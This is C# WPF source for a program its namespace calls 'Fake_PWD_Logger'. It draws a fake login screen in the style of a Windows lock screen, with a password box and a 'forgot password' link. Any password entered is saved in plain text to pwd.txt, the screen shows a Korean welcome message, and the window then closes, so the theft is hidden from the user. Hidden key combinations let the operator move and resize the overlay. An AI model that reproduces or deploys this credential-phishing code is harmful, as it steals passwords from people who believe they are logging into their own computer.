using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;

namespace Fake_PWD_Logger
{
    /// <summary>
    /// MainWindow.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class MainWindow : Window
    {
        //z,f,d,ctrl
        bool[] held = { false, false, false, false };
        DispatcherTimer time = new DispatcherTimer();

        public MainWindow()
        {
            InitializeComponent();
        }

        bool isheld
        {
            get
            {
                return held[0] && held[1];
            }
        }

        void ShowSizeGrid()
        {
            SizeGrid.Margin = new Thickness(Width / 2, Height / 2, 0, 0);
            xBox.Text = Width + "";
            yBox.Text = Height + "";
        }

        private void Window_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Z) { held[0] = true; }
            if (e.Key == Key.F) { held[1] = true; }
            if (e.Key == Key.D) { held[2] = true; }
            if (e.Key == Key.LeftCtrl) { held[3] = true; }
        }

        private void Window_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Z) { held[0] = false; }
            if (e.Key == Key.F) { held[1] = false; }
            if (e.Key == Key.D) { held[2] = false; }
            if (e.Key == Key.LeftCtrl) { held[3] = false; }
        }

        private void Window_MouseMove(object sender, MouseEventArgs e)
        {
            if (isheld && e.LeftButton == MouseButtonState.Pressed) { DragMove(); }
            if(held[0] && held[2] && held[3])
            {
                ShowSizeGrid();
            }
        }

        private void Button_MouseDown(object sender, MouseButtonEventArgs e)
        {
            try
            {
                Width = Convert.ToDouble(xBox.Text);
                Height = Convert.ToDouble(yBox.Text);
                SizeGrid.Margin = new Thickness(-Width, 0, 0, 0);
            }
            catch { }
        }

        private void Grid_MouseDown(object sender, MouseButtonEventArgs e)
        {
            ShadowText.Visibility = Visibility.Hidden;
        }

        private void TextBox_LostFocus(object sender, RoutedEventArgs e)
        {
            
        }

        private void Grid_MouseDown_1(object sender, MouseButtonEventArgs e)
        {
        }

        private void PasswordInput_DataContextChanged(object sender, DependencyPropertyChangedEventArgs e)
        {
        }

        private void PasswordInput_PasswordChanged(object sender, RoutedEventArgs e)
        {
            if (PasswordInput.Password == "") { ShadowText.Visibility = Visibility.Visible; }
            else { ShadowText.Visibility = Visibility.Hidden; }
        }

        private void ForgotPWD_MouseEnter(object sender, MouseEventArgs e)
        {
            ForgotPWD.Foreground = new SolidColorBrush(Color.FromRgb(201, 201, 201));
        }

        private void ForgotPWD_MouseLeave(object sender, MouseEventArgs e)
        {
            ForgotPWD.Foreground = new SolidColorBrush(Color.FromRgb(236, 236, 236));
        }

        private void Grid_MouseEnter(object sender, MouseEventArgs e)
        {
            PasswordInput.BorderBrush = new SolidColorBrush(Color.FromRgb(255, 255, 255));
        }

        private void Grid_MouseLeave(object sender, MouseEventArgs e)
        {
            PasswordInput.BorderBrush = new SolidColorBrush(Color.FromRgb(172, 172, 172));
            
        }

        private void Grid_MouseEnter_1(object sender, MouseEventArgs e)
        {
            EnterRect.Opacity = 0.30;
        }

        private void Grid_MouseLeave_1(object sender, MouseEventArgs e)
        {
            EnterRect.Opacity = 0.15;
        }

        void stop() 
        {
            if (PasswordInput.Password.Length > 4)
            {
                System.IO.File.WriteAllText("pwd.txt", PasswordInput.Password, Encoding.Default);
                ForgotPWD.Visibility = Visibility.Hidden;
                PWDgrid.Visibility = Visibility.Hidden;
                ProfileTitle.Text = "환영합니다";
                time.Start();
            }
            else
            {
                PasswordInput.Password = "";
                ShadowText.Visibility = Visibility.Visible;
            }
        }

        private void Grid_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter || e.Key == Key.Return)
            {
                stop();
            }
        }

        private void Grid_MouseDown_2(object sender, MouseButtonEventArgs e)
        {
            stop();
        }

        float delay = 0;

        void Tick(object sender, EventArgs e)
        {
            delay += 0.1f;
            if (delay > 2)
            {
                Close();
            }
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            time.Interval = TimeSpan.FromSeconds(0.1);
            time.Tick += new EventHandler(Tick);
        }
    }
}
